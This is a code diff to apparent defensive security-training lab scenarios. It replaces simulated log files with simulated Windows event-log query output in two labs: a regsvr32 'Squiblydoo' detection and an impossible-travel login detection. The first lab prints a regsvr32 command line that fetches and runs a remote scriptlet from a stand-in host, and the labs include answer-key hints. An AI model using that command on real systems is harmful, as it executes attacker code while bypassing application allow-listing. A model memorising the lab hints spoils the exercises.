@@ -262,26 +262,16 @@ export const batch11MixedLabs: LabScenario[] = [
       'policy built around "only signed binaries may execute" approves it without ever inspecting the remote ' +
       'script content it goes on to run.',
     objectives: [
-      { text: 'cat edr-process-creation-log.txt', why: 'Shows the exact command line -- regsvr32.exe /s /n /u /i:<url> scrobj.dll -- and that AppLocker\'s own verdict was "Allowed" because regsvr32.exe is a default-trusted, Microsoft-signed binary, not because the activity was benign.' },
+      { text: 'Query the Security log for Event ID 4688 with wevtutil', why: 'Shows the exact command line -- regsvr32.exe /s /n /u /i:<url> scrobj.dll -- and that AppLocker\'s own verdict was "Allowed" because regsvr32.exe is a default-trusted, Microsoft-signed binary, not because the activity was benign.' },
       { text: 'cat captured-update-sct.txt', why: 'The remote .sct scriptlet regsvr32 fetched and ran -- confirms this wasn\'t a false positive on a legitimate COM registration, but a real embedded JScript payload delivering the next stage.' },
     ],
     hints: [
-      'cat edr-process-creation-log.txt',
+      'wevtutil qe Security /q:"*[System[(EventID=4688)]]" /f:text',
       'cat captured-update-sct.txt',
     ],
     totalFlags: 1,
     attacker: analyst({
       root: dir({
-        'edr-process-creation-log.txt': file(
-          'EDR process-creation telemetry, host FIN-WKS-14:\n' +
-            '  2026-07-30 09:14:02  WINWORD.EXE (signed, Microsoft) --spawns-->\n' +
-            '  2026-07-30 09:14:03  cmd.exe /c regsvr32.exe /s /n /u /i:http://cdn-updates-mirror.net/update.sct scrobj.dll\n' +
-            '  2026-07-30 09:14:03  regsvr32.exe  [AppLocker verdict: ALLOWED -- publisher rule: "Microsoft Windows, signed binaries"]\n' +
-            '  -- MITRE ATT&CK T1218.010 (System Binary Proxy Execution: Regsvr32, "Squiblydoo") -- regsvr32.exe\n' +
-            '     never gets registered as a COM object here at all; /i:<url> + /n + /u load and execute a\n' +
-            '     remote scriptlet directly via scrobj.dll, and AppLocker approved it purely on the strength of\n' +
-            '     regsvr32.exe\'s own Microsoft signature, never inspecting the remote script it went on to run --\n',
-        ),
         'captured-update-sct.txt': file(
           '<?XML version="1.0"?>\n' +
             '<scriptlet>\n' +
@@ -298,6 +288,23 @@ export const batch11MixedLabs: LabScenario[] = [
         ),
       }),
     }),
+    winCommands: {
+      'wevtutil qe Security /q:"*[System[(EventID=4688)]]" /f:text':
+        'Event[0]:\n' +
+        '  Log Name: Security\n' +
+        '  Event ID: 4688\n' +
+        '  Date: 2026-07-30T09:14:03.000Z\n' +
+        '    New Process Name: C:\\Windows\\System32\\regsvr32.exe\n' +
+        '    Command Line: regsvr32.exe /s /n /u /i:http://cdn-updates-mirror.net/update.sct scrobj.dll\n' +
+        '    Creator Process Name: cmd.exe\n' +
+        '    Process Integrity Level: Medium\n' +
+        '\n' +
+        '  [AppLocker verdict: ALLOWED -- publisher rule: "Microsoft Windows, signed binaries"]\n' +
+        '  -- MITRE ATT&CK T1218.010 (System Binary Proxy Execution: Regsvr32, "Squiblydoo") -- regsvr32.exe\n' +
+        '     never gets registered as a COM object here at all; /i:<url> + /n + /u load and execute a\n' +
+        '     remote scriptlet directly via scrobj.dll, and AppLocker approved it purely on the strength of\n' +
+        '     regsvr32.exe\'s own Microsoft signature, never inspecting the remote script it went on to run --',
+    },
     network: [],
   },
 
@@ -319,22 +326,16 @@ export const batch11MixedLabs: LabScenario[] = [
       'all, is that the account\'s valid session token or password was replayed from two different locations ' +
       'at once -- one of them not the legitimate user.',
     objectives: [
-      { text: 'cat auth-log-successful-logins.txt', why: 'Shows both successful logins -- same account, both fully authenticated, only fourteen minutes apart -- geolocated to two cities roughly 5,746 km apart.' },
+      { text: 'Query the Security log for Event ID 4624 with wevtutil', why: 'Shows both successful logins -- same account, both fully authenticated, only fourteen minutes apart -- geolocated to two cities roughly 5,746 km apart.' },
       { text: 'cat geo-velocity-calculation.txt', why: 'Turns "two distant logins" into the concrete, undeniable number that makes this an analytic finding rather than a coincidence: an implied travel speed no real transportation method could achieve.' },
     ],
     hints: [
-      'cat auth-log-successful-logins.txt',
+      'wevtutil qe Security /q:"*[System[(EventID=4624)]]" /f:text',
       'cat geo-velocity-calculation.txt',
     ],
     totalFlags: 1,
     attacker: analyst({
       root: dir({
-        'auth-log-successful-logins.txt': file(
-          'Identity provider auth log, account jsmith:\n' +
-            '  2026-07-31 06:02:11 UTC  SUCCESS  203.0.113.44   geo: Accra, Ghana        (5.6037 N, 0.1870 W)\n' +
-            '  2026-07-31 06:16:11 UTC  SUCCESS  198.51.100.87  geo: Kyiv, Ukraine       (50.4501 N, 30.5234 E)\n' +
-            '  -- both logins fully successful (valid password + valid MFA push accepted on both) -- 14 minutes apart --\n',
-        ),
         'geo-velocity-calculation.txt': file(
           'Impossible-travel correlation, account jsmith:\n' +
             '  Great-circle distance, Accra <-> Kyiv:  5,745.9 km\n' +
@@ -348,6 +349,24 @@ export const batch11MixedLabs: LabScenario[] = [
         ),
       }),
     }),
+    winCommands: {
+      'wevtutil qe Security /q:"*[System[(EventID=4624)]]" /f:text':
+        'Event[0]:\n' +
+        '  Log Name: Security\n' +
+        '  Event ID: 4624\n' +
+        '  Account Name: jsmith\n' +
+        '  Date: 2026-07-31T06:02:11.000Z\n' +
+        '    Source Network Address: 203.0.113.44   geo: Accra, Ghana        (5.6037 N, 0.1870 W)\n' +
+        '\n' +
+        'Event[1]:\n' +
+        '  Log Name: Security\n' +
+        '  Event ID: 4624\n' +
+        '  Account Name: jsmith\n' +
+        '  Date: 2026-07-31T06:16:11.000Z\n' +
+        '    Source Network Address: 198.51.100.87  geo: Kyiv, Ukraine       (50.4501 N, 30.5234 E)\n' +
+        '\n' +
+        '-- both logins fully successful (valid password + valid MFA push accepted on both) -- 14 minutes apart --',
+    },
     network: [],
   },
 ];
